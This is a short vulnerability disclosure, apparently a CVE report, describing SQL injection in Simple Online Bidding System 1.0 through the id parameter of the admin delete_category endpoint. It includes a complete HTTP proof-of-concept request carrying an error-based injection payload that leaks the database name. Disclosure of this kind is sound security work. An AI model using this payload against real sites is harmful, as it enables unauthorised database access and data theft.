## Affected version: 
Simple Online Bidding System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability File:
/simple-online-bidding-system/admin/ajax.php?action=delete_category

## Description:
Simple Online Bidding System 1.0 is vulnerable to unrestricted SQL injection attacks via /simple-online-bidding-system/admin/ajax.php?action=delete_category, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /simple-online-bidding-system/admin/ajax.php?action=delete_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/admin/index.php?page=categories
Cookie: PHPSESSID=44palbgphqda0ug0pvlpmao3tp
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

id=1%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/b2bcd1e3-6c44-4782-b0be-8ef4fc8176ba)


## code analysis:

The id parameter in admin_class.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/dfe9f651-8c70-40b4-8142-3232ccb2c2d5)


